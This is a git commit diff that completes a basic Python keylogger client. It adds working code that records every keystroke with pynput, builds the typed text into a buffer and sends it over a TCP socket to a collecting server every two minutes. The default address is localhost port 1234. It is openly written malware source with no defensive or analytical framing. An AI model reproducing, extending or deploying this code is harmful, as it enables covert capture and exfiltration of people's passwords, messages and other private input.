6fc0bc2cd431c77fe0a17d5977b537eca209b82b
root <root@localhost.localdomain>
2019-07-24 01:28:57 +0530

    complete basic keylogger client

--- client/keylogger.py
+++ client/keylogger.py
@@ -1,4 +1,9 @@
 from pynput import keyboard
+import logging
+
+'''
+    Helper Class to start capturing the key strokes on client keyboard
+'''
 
 
 class Keylogger:
@@ -10,34 +15,82 @@ class Keylogger:
         self.logger = lambda x: True
         self.key_pressed = ''
 
+    '''
+        A callback method which is called everytime when a pressed key
+        is released
+    '''
+
     def on_release(self, key):
-        print('{} release'.format(key))
-        self.logger(self.key_press_event(key))
+        logging.debug('{} release'.format(key))
+        self.logger(self.key_press_event(key))  # Event call back to client class
+
+    '''
+        A callback method which is called everytime a key is pressed
+        on a keyboard
+    '''
 
     def on_press(self, key):
         try:
-            print('{} key pressed'.format(key.char))
+            logging.debug('{} key pressed'.format(key.char))
         except AttributeError:
-            print('{} key pressed'.format(key))
+            logging.debug('{} key pressed'.format(key))
+
+    '''
+        helper method to get particular string depeding on the 
+        key stroke made by the user
+    '''
 
     def switch_key_stoke(self, key):
         switcher = {
             keyboard.Key.space: ' ',
             keyboard.Key.enter: '\n',
-            keyboard.Key.tab: '\t'
+            keyboard.Key.tab: '\t',
+            keyboard.Key.shift: '',
+            keyboard.Key.shift_r: '',
+            keyboard.Key.right: '',
+            keyboard.Key.left: '',
+            keyboard.Key.up: '',
+            keyboard.Key.down: '',
+            keyboard.Key.page_down: '',
+            keyboard.Key.page_up: '',
+            keyboard.Key.home: '',
+            keyboard.Key.end: '',
+            keyboard.Key.ctrl: '',
+            keyboard.Key.ctrl_r: '',
+            keyboard.Key.alt: '',
+            keyboard.Key.alt_r: '',
+            keyboard.Key.print_screen: '',
+            keyboard.Key.insert: '',
+            keyboard.Key.backspace: '',
+            keyboard.Key.delete: ''
         }
-        return switcher.get(key, key)
+        return switcher.get(key, key if isinstance(key, keyboard.Key) else key.char)
+
+    '''
+        helper method to create an event and send to client class
+    '''
 
     def key_press_event(self, key):
         keyString = self.switch_key_stoke(key)
         return KeyboardEvent(keyString)
 
+    '''
+        Utiltility method to start capturing the keystrokes on 
+        the keyboard
+    '''
+
     def start(self):
         with keyboard.Listener(
-            on_press=self.on_press,
-            on_release=self.on_release
+                on_press=self.on_press,
+                on_release=self.on_release
         ) as listener:
             listener.join()
+
+
+'''
+    class to make event that will be bind to keylogger
+    client class
+'''
 
 
 class KeyboardEvent:
--- client/keylogger_client.py
+++ client/keylogger_client.py
@@ -1,23 +1,72 @@
 import keylogger
+import threading
+import socket
+import logging
+
+'''
+    This class is used to start the keylogger client and 
+    send data captured in client computers to server in every
+    2 minutes interval
+'''
 
 
 class KeyloggerClient(object):
 
     def __init__(self):
         print('Keylogger Client')
+        self.logger = ''
+        self.client = object()
+
+    '''
+        Callback mthod which is called every time a keyboard key is pressed
+    '''
 
     def keyboard_event(self, event):
-        print(event.key)
+        self.logger = self.logger + event.key
 
-    def start(self):
+    '''
+        Method to send keystrokes and data captured from client
+        to server in every 2 minutes
+    '''
+
+    def send_log_to_server(self):
+        # running this function every 2 min to send data to server
+        threading.Timer(120.0, self.send_log_to_server).start()
+        self.client.send(self.logger.encode())
+        logging.debug('send data to server')
+        logging.debug('data: ', self.logger)
+
+    '''
+        Method to make a TCP connection to server
+        AF_INET: use standard IPv4 addressing
+        SOCK_STREAM: indicates this is the TCP client
+    '''
+
+    def connect_to_server(self, server_address, port):
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect((server_address, port))
+            return True
+        except Exception as e:
+            logging.exception(e)
+            return False
+
+    '''
+        Utility method to start the keylogger client
+    '''
+
+    def start(self, server_address, port):
+        is_connected = self.connect_to_server(server_address, port)
         key_logger = keylogger.Keylogger()
         key_logger.logger = self.keyboard_event
+        if is_connected:
+            self.send_log_to_server()
         key_logger.start()
 
 
 def main():
     key_logger_client = KeyloggerClient()
-    key_logger_client.start()
+    key_logger_client.start('127.0.0.1', 1234)
 
 
 if __name__ == '__main__':
